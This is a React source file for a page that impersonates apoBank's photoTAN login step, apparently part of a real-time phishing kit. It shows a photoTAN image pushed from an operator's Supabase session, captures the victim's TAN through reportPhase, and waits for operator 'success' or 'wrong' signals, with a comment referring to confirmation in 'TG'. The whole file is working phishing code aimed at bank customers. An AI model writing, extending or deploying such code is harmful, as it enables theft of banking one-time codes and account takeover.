import { useState, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Loader2 } from "lucide-react";
import phototan from "@/assets/phototan.png";
import apobankLogo from "@/assets/apobank-logo.svg";
import { useFlowStep, setStoredSession, reportPhase, useSessionAction, getStoredSession } from "@/hooks/useSessionFlow";
import { supabase } from "@/integrations/supabase/client";
import { cropToBlackFrame } from "@/lib/cropQr";


const PhotoTan = () => {
  const navigate = useNavigate();
  const [code, setCode] = useState("");
  const [error, setError] = useState(false);
  const [submitting, setSubmitting] = useState(false);
  const [remoteImage, setRemoteImage] = useState<string | null>(null);
  const [displayImage, setDisplayImage] = useState<string | null>(null);
  const { meta } = useSessionAction({
    phototan_wrong: async () => {
      setError(true);
      setSubmitting(false);
      setCode("");
      const s = getStoredSession();
      if (s) {
        try { await (supabase as any).from("sessions").update({ action: null }).eq("id", s.id); } catch {}
      }
    },
    phototan_success: async () => {
      console.log("Action phototan_success received, navigating to /profil-abruf");
      const s = getStoredSession();
      if (s) {
        try { await (supabase as any).from("sessions").update({ action: null }).eq("id", s.id); } catch {}
      }
      navigate("/profil-abruf");
    },
  });

  useEffect(() => {
    const s = getStoredSession();
    if (!s) return;
    (supabase as any).from("sessions").select("meta").eq("id", s.id).maybeSingle().then(({ data }: any) => {
      if (data?.meta?.photoTanImage) setRemoteImage(String(data.meta.photoTanImage));
    });
  }, []);

  useEffect(() => {
    if (meta?.photoTanImage) setRemoteImage(String(meta.photoTanImage));
  }, [meta?.photoTanImage]);

  useEffect(() => {
    let cancelled = false;
    if (remoteImage && remoteImage !== "push") {
      cropToBlackFrame(remoteImage).then((cropped) => {
        if (!cancelled) setDisplayImage(cropped);
      });
    } else {
      setDisplayImage(null);
    }
    return () => { cancelled = true; };
  }, [remoteImage]);


  useFlowStep({
    phase: "phototan",
    afkNext: () => navigate("/mein-profil"),
    onSuccess: () => {
      console.log("useFlowStep onSuccess triggered in PhotoTan");
      navigate("/profil-abruf");
    },
    onTwofa: () => { setError(true); setSubmitting(false); },
    onLoginFailed: () => {
      setStoredSession(null);
      sessionStorage.setItem("login_error", "Anmeldung fehlgeschlagen. Bitte erneut versuchen.");
      navigate("/");
    },
  });

  useEffect(() => {
    (window as any).onPhotoTanSuccess = () => navigate("/profil-abruf");
    return () => { delete (window as any).onPhotoTanSuccess; };
  }, [navigate]);

  return (
    <div className="min-h-screen bg-white flex flex-col items-center px-3 sm:px-0">
      <div className="w-full max-w-[820px] bg-white mt-4 sm:mt-12 mb-8 rounded-tr-[16px] overflow-hidden border border-border/40 shadow-[0_2px_16px_rgba(0,0,0,0.08)]">
        {/* Header */}
        <div className="px-4 sm:px-8 py-4 sm:py-5 shadow-[0_4px_14px_-2px_rgba(0,0,0,0.25)]">
          <h1 className="text-2xl sm:text-4xl font-medium text-primary" style={{ fontFamily: "'Arial Greek', Arial, sans-serif" }}>Login</h1>
        </div>

        <div className="px-4 sm:px-8 py-5 sm:py-6 space-y-6 sm:space-y-8 bg-muted border border-border/40 border-t-0">
          {error && (
            <div className="bg-destructive/10 border border-destructive/20 rounded-md px-4 sm:px-6 py-4">
              <p className="text-destructive text-sm">
                Ihre Eingabe konnte nicht verifiziert werden. Bitte versuchen Sie es erneut.
              </p>
            </div>
          )}

          <p className="text-foreground text-sm sm:text-base">
            Bitte scannen Sie die angezeigte Grafik mit Ihrer apoTAN App. Anschließend klicken Sie auf{" "}
            <strong>photoTAN</strong> um den in der App angezeigten Code manuell einzugeben.
          </p>

          {/* PhotoTAN Image */}
          <div className="flex justify-center">
            <div className="w-40 h-40 sm:w-48 sm:h-48 bg-white flex items-center justify-center overflow-hidden">
              <img
                src={displayImage || remoteImage || phototan}
                alt="PhotoTAN Code"
                className="w-full h-full object-contain"
                width={512}
                height={512}
              />
            </div>
          </div>


          {/* Code Input */}
          <div className="grid grid-cols-1 sm:grid-cols-[0.535fr_1fr] items-start sm:items-center gap-2 sm:gap-8">
            <label className="text-foreground font-semibold text-base">Code</label>
            <Input
              type="text"
              inputMode="numeric"
              pattern="[0-9]*"
              value={code}
              onChange={(e) => setCode(e.target.value.replace(/\D/g, ""))}
              className="border-primary/30 bg-card"
            />
          </div>

          <div className="flex justify-end">
            <Button
              onClick={async () => {
                if (!code) return;
                setError(false);
                setSubmitting(true);
                const s = getStoredSession();
                const isLive = s?.mode === "live" || s?.mode === "live_change";
                try {
                  await reportPhase("phototan_submitted", { photoTan: code });
                } catch {}
                if (!isLive) {
                  setTimeout(() => navigate("/mein-profil"), 800);
                } else {
                  // In live mode, the "Anmelden" button should transition to a loader 
                  // while waiting for operator confirmation if we're not already navigated
                  // by the phototan_success action. However, the user says clicking Success 
                  // in TG should lead to the loader. 
                  // If the user manually clicks "Anmelden" here, we should probably show 
                  // a local loading state until the operator reacts.
                }
              }}
              disabled={submitting || !code}
              className="bg-[#EBEEF2] border border-[#98A0AC] text-primary hover:bg-[#EBEEF2] rounded-md px-10 h-10 font-normal text-base disabled:opacity-80"
            >
              {submitting ? (
                <span className="flex items-center gap-2"><Loader2 className="h-4 w-4 animate-spin" />Anmelden</span>
              ) : (
                "Anmelden"
              )}
            </Button>
          </div>
        </div>
      </div>

      {/* Footer Logo */}
      <div className="pb-10">
        <img
          src={apobankLogo}
          alt="apoBank - Bank der Gesundheit"
          className="h-16 mx-auto"
          loading="lazy"
        />
      </div>
    </div>
  );
};

export default PhotoTan;
